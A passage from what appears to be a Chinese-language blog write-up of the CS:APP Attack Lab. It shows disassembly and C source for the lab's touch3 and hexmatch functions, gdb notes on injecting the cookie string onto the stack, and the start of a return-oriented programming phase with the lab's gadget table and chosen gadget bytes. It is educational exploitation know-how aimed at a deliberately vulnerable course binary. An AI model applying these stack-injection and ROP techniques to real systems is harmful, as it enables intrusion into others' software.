+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">a3:</span>	<span class="err">48</span> <span class="err">01</span> <span class="nf">ca</span>             	<span class="no">add</span>    <span class="nv">%rcx</span><span class="p">,</span><span class="nv">%rdx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">a6:</span>	<span class="err">48</span> <span class="nf">c1</span> <span class="no">fa</span> <span class="mi">06</span>          	<span class="no">sar</span>    <span class="no">$0x6</span><span class="p">,</span><span class="nv">%rdx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">aa:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">c8</span>             	<span class="no">mov</span>    <span class="nv">%rcx</span><span class="p">,</span><span class="nv">%rax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">ad:</span>	<span class="err">48</span> <span class="nf">c1</span> <span class="no">f8</span> <span class="mi">3</span><span class="no">f</span>          	<span class="no">sar</span>    <span class="no">$0x3f</span><span class="p">,</span><span class="nv">%rax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">b1:</span>	<span class="err">48</span> <span class="err">29</span> <span class="nf">c2</span>             	<span class="no">sub</span>    <span class="nv">%rax</span><span class="p">,</span><span class="nv">%rdx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">b4:</span>	<span class="err">48</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">04</span> <span class="mi">92</span>          	<span class="no">lea</span>    <span class="p">(</span><span class="nv">%rdx</span><span class="p">,</span><span class="nv">%rdx</span><span class="p">,</span><span class="mi">4</span><span class="p">),</span><span class="nv">%rax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">b8:</span>	<span class="err">48</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">14</span> <span class="mi">80</span>          	<span class="no">lea</span>    <span class="p">(</span><span class="nv">%rax</span><span class="p">,</span><span class="nv">%rax</span><span class="p">,</span><span class="mi">4</span><span class="p">),</span><span class="nv">%rdx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">bc:</span>	<span class="err">48</span> <span class="err">8</span><span class="nf">d</span> <span class="mi">04</span> <span class="mi">95</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 	<span class="no">lea</span>    <span class="mi">0x0</span><span class="p">(,</span><span class="nv">%rdx</span><span class="p">,</span><span class="mi">4</span><span class="p">),</span><span class="nv">%rax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">c3:</span>	<span class="err">00</span> 
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">c4:</span>	<span class="err">48</span> <span class="err">29</span> <span class="nf">c1</span>             	<span class="no">sub</span>    <span class="nv">%rax</span><span class="p">,</span><span class="nv">%rcx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">c7:</span>	<span class="err">4</span><span class="nf">c</span> <span class="mi">8</span><span class="no">d</span> <span class="mi">24</span> <span class="mi">0</span><span class="no">c</span>          	<span class="no">lea</span>    <span class="p">(</span><span class="nv">%rsp</span><span class="p">,</span><span class="nv">%rcx</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="nv">%r12</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">cb:</span>	<span class="err">41</span> <span class="err">89</span> <span class="nf">e8</span>             	<span class="no">mov</span>    <span class="nv">%ebp</span><span class="p">,</span><span class="nv">%r8d</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">ce:</span>	<span class="nf">b9</span> <span class="mi">3</span><span class="no">f</span> <span class="mi">31</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x40313f</span><span class="p">,</span><span class="nv">%ecx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">d3:</span>	<span class="err">48</span> <span class="nf">c7</span> <span class="no">c2</span> <span class="no">ff</span> <span class="no">ff</span> <span class="no">ff</span> <span class="no">ff</span> 	<span class="no">mov</span>    <span class="no">$0xffffffffffffffff</span><span class="p">,</span><span class="nv">%rdx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">da:</span>	<span class="nf">be</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x1</span><span class="p">,</span><span class="nv">%esi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">df:</span>	<span class="err">4</span><span class="nf">c</span> <span class="mi">89</span> <span class="no">e7</span>             	<span class="no">mov</span>    <span class="nv">%r12</span><span class="p">,</span><span class="nv">%rdi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">e2:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">e7:</span>	<span class="nf">e8</span> <span class="mi">44</span> <span class="no">f4</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400e30</span> <span class="p">&lt;</span><span class="no">__sprintf_chk@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">ec:</span>	<span class="nf">ba</span> <span class="mi">09</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x9</span><span class="p">,</span><span class="nv">%edx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">f1:</span>	<span class="err">4</span><span class="nf">c</span> <span class="mi">89</span> <span class="no">e6</span>             	<span class="no">mov</span>    <span class="nv">%r12</span><span class="p">,</span><span class="nv">%rsi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">f4:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">df</span>             	<span class="no">mov</span>    <span class="nv">%rbx</span><span class="p">,</span><span class="nv">%rdi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">f7:</span>	<span class="nf">e8</span> <span class="mi">34</span> <span class="no">f3</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400d30</span> <span class="p">&lt;</span><span class="no">strncmp@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">fc:</span>	<span class="err">85</span> <span class="nf">c0</span>                	<span class="no">test</span>   <span class="nv">%eax</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4019</span><span class="nl">fe:</span>	<span class="err">0</span><span class="nf">f</span> <span class="mi">94</span> <span class="no">c0</span>             	<span class="no">sete</span>   <span class="nv">%al</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a01:</span>	<span class="err">48</span> <span class="err">8</span><span class="nf">b</span> <span class="mi">5</span><span class="no">c</span> <span class="mi">24</span> <span class="mi">78</span>       	<span class="no">mov</span>    <span class="mi">0x78</span><span class="p">(</span><span class="nv">%rsp</span><span class="p">),</span><span class="nv">%rbx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a06:</span>	<span class="err">64</span> <span class="err">48</span> <span class="err">33</span> <span class="err">1</span><span class="nf">c</span> <span class="mi">25</span> <span class="mi">28</span> <span class="mi">00</span> 	<span class="no">xor</span>    <span class="nv">%fs</span><span class="p">:</span><span class="mi">0x28</span><span class="p">,</span><span class="nv">%rbx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a0d:</span>	<span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a0f:</span>	<span class="err">74</span> <span class="err">05</span>                	<span class="nf">je</span>     <span class="mh">401a16</span> <span class="p">&lt;</span><span class="no">hexmatch</span><span class="p">+</span><span class="mi">0xa5</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a11:</span>	<span class="nf">e8</span> <span class="mi">5</span><span class="no">a</span> <span class="no">f3</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400d70</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a16:</span>	<span class="err">0</span><span class="nf">f</span> <span class="no">b6</span> <span class="no">c0</span>             	<span class="no">movzbl</span> <span class="nv">%al</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a19:</span>	<span class="err">48</span> <span class="err">83</span> <span class="nf">ec</span> <span class="mi">80</span>          	<span class="no">sub</span>    <span class="no">$0xffffffffffffff80</span><span class="p">,</span><span class="nv">%rsp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a1d:</span>	<span class="err">5</span><span class="nf">b</span>                   	<span class="no">pop</span>    <span class="nv">%rbx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a1e:</span>	<span class="err">5</span><span class="nf">d</span>                   	<span class="no">pop</span>    <span class="nv">%rbp</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a1f:</span>	<span class="err">41</span> <span class="err">5</span><span class="nf">c</span>                	<span class="no">pop</span>    <span class="nv">%r12</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a21:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401a22</span> <span class="p">&lt;</span><span class="no">touch3</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a22:</span>	<span class="err">53</span>                   	<span class="nf">push</span>   <span class="nv">%rbx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a23:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">fb</span>             	<span class="no">mov</span>    <span class="nv">%rdi</span><span class="p">,</span><span class="nv">%rbx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a26:</span>	<span class="nf">c7</span> <span class="mi">05</span> <span class="no">f0</span> <span class="mi">2</span><span class="no">a</span> <span class="mi">20</span> <span class="mi">00</span> <span class="mi">03</span> 	<span class="no">movl</span>   <span class="no">$0x3</span><span class="p">,</span><span class="mi">0x202af0</span><span class="p">(</span><span class="nv">%rip</span><span class="p">)</span>        <span class="c1"># 604520 &lt;vlevel&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401</span><span class="nl">a2d:</span>	<span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a30:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">fe</span>             	<span class="no">mov</span>    <span class="nv">%rdi</span><span class="p">,</span><span class="nv">%rsi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a33:</span>	<span class="err">8</span><span class="nf">b</span> <span class="mi">3</span><span class="no">d</span> <span class="no">ef</span> <span class="mi">2</span><span class="no">a</span> <span class="mi">20</span> <span class="mi">00</span>    	<span class="no">mov</span>    <span class="mi">0x202aef</span><span class="p">(</span><span class="nv">%rip</span><span class="p">),</span><span class="nv">%edi</span>        <span class="c1"># 604528 &lt;cookie&gt;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401</span><span class="nl">a39:</span>	<span class="nf">e8</span> <span class="mi">33</span> <span class="no">ff</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">401971</span> <span class="p">&lt;</span><span class="no">hexmatch</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a3e:</span>	<span class="err">85</span> <span class="nf">c0</span>                	<span class="no">test</span>   <span class="nv">%eax</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a40:</span>	<span class="err">74</span> <span class="err">23</span>                	<span class="nf">je</span>     <span class="mh">401a65</span> <span class="p">&lt;</span><span class="no">touch3</span><span class="p">+</span><span class="mi">0x43</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a42:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">da</span>             	<span class="no">mov</span>    <span class="nv">%rbx</span><span class="p">,</span><span class="nv">%rdx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a45:</span>	<span class="nf">be</span> <span class="mi">98</span> <span class="mi">31</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x403198</span><span class="p">,</span><span class="nv">%esi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a4a:</span>	<span class="nf">bf</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x1</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a4f:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a54:</span>	<span class="nf">e8</span> <span class="mi">97</span> <span class="no">f2</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400cf0</span> <span class="p">&lt;</span><span class="no">__printf_chk@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a59:</span>	<span class="nf">bf</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x3</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a5e:</span>	<span class="nf">e8</span> <span class="mi">36</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">call</span>   <span class="mh">401c99</span> <span class="p">&lt;</span><span class="no">validate</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a63:</span>	<span class="nf">eb</span> <span class="mi">21</span>                	<span class="no">jmp</span>    <span class="mh">401a86</span> <span class="p">&lt;</span><span class="no">touch3</span><span class="p">+</span><span class="mi">0x64</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a65:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">da</span>             	<span class="no">mov</span>    <span class="nv">%rbx</span><span class="p">,</span><span class="nv">%rdx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a68:</span>	<span class="nf">be</span> <span class="no">c0</span> <span class="mi">31</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x4031c0</span><span class="p">,</span><span class="nv">%esi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a6d:</span>	<span class="nf">bf</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x1</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a72:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a77:</span>	<span class="nf">e8</span> <span class="mi">74</span> <span class="no">f2</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400cf0</span> <span class="p">&lt;</span><span class="no">__printf_chk@plt</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a7c:</span>	<span class="nf">bf</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x3</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a81:</span>	<span class="nf">e8</span> <span class="no">d5</span> <span class="mi">02</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">call</span>   <span class="mh">401d5b</span> <span class="p">&lt;</span><span class="no">fail</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a86:</span>	<span class="nf">bf</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x0</span><span class="p">,</span><span class="nv">%edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">a8b:</span>	<span class="nf">e8</span> <span class="mi">40</span> <span class="no">f4</span> <span class="no">ff</span> <span class="no">ff</span>       	<span class="no">call</span>   <span class="mh">400ed0</span> <span class="p">&lt;</span><span class="no">exit@plt</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>这是上面两个函数的C语言源代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* Compare string to hex represention of unsigned value */</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">hexmatch</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">cbuf</span><span class="p">[</span><span class="mi">110</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* Make position of check string unpredictable */</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">cbuf</span> <span class="o">+</span> <span class="nf">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>	<span class="c1">//这里随机分配可能导致的结果是把我们注入的字符串覆盖掉
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">sprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;%.8x&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nf">strncmp</span><span class="p">(</span><span class="n">sval</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">touch3</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vlevel</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="cm">/* Part of validation protocol */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">hexmatch</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sval</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Touch3!: You called touch3(</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">validate</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Misfire: You called touch3(</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fail</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>gdb调试（先跟第二层一样跳转到touch3）：</p>
+<p>先查看进入hexmatch之前的缓冲区，我们注入的代码还在（未使用的部分用3f填充）</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/img/image-20250319155321094.png" alt="image-20250319155321094" />
+      
+    </figure>
+</p>
+<p>在进入了之后（我们发现有一部分已经被覆盖，但是没有威胁到我们的代码，所以这只是概率事件）：</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/img/image-20250319155627424.png" alt="image-20250319155627424" />
+      
+    </figure>
+</p>
+<p>看起来28这里一直都是0,我们尝试把字符数组放在这里：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">man</span> <span class="no">ascii</span> <span class="c1">//查看关于ascii的帮助
+</span></span></span></code></pre></div><p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/img/image-20250319160631318.png" alt="image-20250319160631318" />
+      
+    </figure>
+</p>
+<p>cookie&mdash;&gt;ascii</p>
+<p>0x14e6646f&mdash;&gt;31 34 65 36 36 34 36 66</p>
+<p>担心出错，再检查一遍：</p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/img/image-20250319162535823.png" alt="image-20250319162535823" />
+      
+    </figure>
+</p>
+<blockquote>
+<p>在更改的时候还要注意：不仅留心小端顺序，还要保证原来调用的函数的参数的值没有发生变化。</p>
+<p>Q：不知道为什么，28的位置写不进去，后面改成18的位置再重新写进去（记得更改rdi指向的地址，假如你错了的话）。</p></blockquote>
+
+
+<h2 class="relative group">返回导向编程（Return-oriented Programming） 
+    <div id="%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8Breturn-oriented-programming" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8Breturn-oriented-programming" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h2 class="relative group">phase4: 
+    <div id="phase4" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#phase4" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<blockquote>
+<p>在前面的情况下，我们都没有启用栈随机化和栈执行保护（在栈上执行代码本来就是一件很可疑的事情），那么就来了这种攻击方式。</p>
+<p>它要解决的还是上面的phase2和phase3的问题。</p>
+<p>这种攻击方式的思路就是说，我们不在栈上执行我们的代码，在它自己本身就有的代码里面挑挑拣拣来达到我们的目的，并且每次执行的指令后面都有c3这样就能不停的继续调用下去。</p></blockquote>
+
+
+<h3 class="relative group">汇编指令的相关字节码： 
+    <div id="%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%9A%84%E7%9B%B8%E5%85%B3%E5%AD%97%E8%8A%82%E7%A0%81" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%9A%84%E7%9B%B8%E5%85%B3%E5%AD%97%E8%8A%82%E7%A0%81" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/img/attacklab_bytecoding_instructions.png" alt="attacklab_bytecoding_instructions.png" />
+      
+    </figure>
+</p>
+
+
+<h3 class="relative group">这是它给我们的gadget表： 
+    <div id="%E8%BF%99%E6%98%AF%E5%AE%83%E7%BB%99%E6%88%91%E4%BB%AC%E7%9A%84gadget%E8%A1%A8" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E8%BF%99%E6%98%AF%E5%AE%83%E7%BB%99%E6%88%91%E4%BB%AC%E7%9A%84gadget%E8%A1%A8" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0000000000401</span><span class="nf">ab9</span> <span class="err">&lt;</span><span class="no">start_farm</span><span class="err">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ab9:</span>	<span class="nf">b8</span> <span class="mi">01</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="no">mov</span>    <span class="no">$0x1</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">abe:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401abf</span> <span class="p">&lt;</span><span class="no">addval_480</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">abf:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">6</span><span class="no">e</span> <span class="no">a5</span> <span class="mi">58</span> <span class="no">c3</span>    	<span class="no">lea</span>    <span class="p">-</span><span class="mi">0x3ca75a92</span><span class="p">(</span><span class="nv">%rdi</span><span class="p">),</span><span class="nv">%eax</span> <span class="c1">;2.3 58 c3 popq %rax (401ac3) ---1.1把rax设置成cookie的值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="err">401</span><span class="nl">ac5:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    						  <span class="c1">; 就是这里，愚蠢的我一直把这里数错了导致几个小时没看出来为什么有segmentaion fault
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="err">0000000000401</span><span class="nf">ac6</span> <span class="err">&lt;</span><span class="no">getval_188</span><span class="err">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ac6:</span>	<span class="nf">b8</span> <span class="no">c8</span> <span class="mi">89</span> <span class="no">c7</span> <span class="mi">90</span>       	<span class="no">mov</span>    <span class="no">$0x90c789c8</span><span class="p">,</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">acb:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401acc</span> <span class="p">&lt;</span><span class="no">addval_392</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">acc:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="mi">58</span> <span class="mi">91</span> <span class="no">c3</span> <span class="mi">9</span><span class="no">e</span>    	<span class="no">lea</span>    <span class="p">-</span><span class="mi">0x613c6ea8</span><span class="p">(</span><span class="nv">%rdi</span><span class="p">),</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ad2:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mh">0000000000401ad3</span> <span class="p">&lt;</span><span class="no">addval_406</span><span class="p">&gt;:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ad3:</span>	<span class="err">8</span><span class="nf">d</span> <span class="mi">87</span> <span class="no">ec</span> <span class="no">ad</span> <span class="no">d8</span> <span class="no">c3</span>    	<span class="no">lea</span>    <span class="p">-</span><span class="mi">0x3c275214</span><span class="p">(</span><span class="nv">%rdi</span><span class="p">),</span><span class="nv">%eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401</span><span class="nl">ad9:</span>	<span class="nf">c3</span>                   	<span class="no">ret</span>    
+</span></span><span class="line"><span class="cl">
